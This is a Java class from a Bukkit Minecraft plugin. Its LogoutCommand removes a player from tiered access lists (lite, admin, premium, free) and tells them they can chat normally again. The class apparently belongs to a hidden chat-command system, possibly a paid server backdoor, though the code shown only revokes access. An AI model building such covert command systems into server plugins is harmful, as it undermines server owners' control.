
package me.system.runner.command.impl;

import me.system.runner.Core;
import me.system.runner.command.Command;
import me.system.runner.utils.Settings;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class LogoutCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        Bukkit.getScheduler().runTaskLater((Plugin)plugin, () -> {
            plugin.lite.remove(p2.getName());
            plugin.admin.remove(p2.getName());
            plugin.premium.remove(p2.getName());
            plugin.free.remove(p2.getName());
        }, 1L);
        p2.sendMessage(Settings.PREFIX("You can now talk in chat and no longer execute " + Settings.NAME + " commands"));
    }

    @Override
    public boolean isBlatant() {
        return false;
    }
}

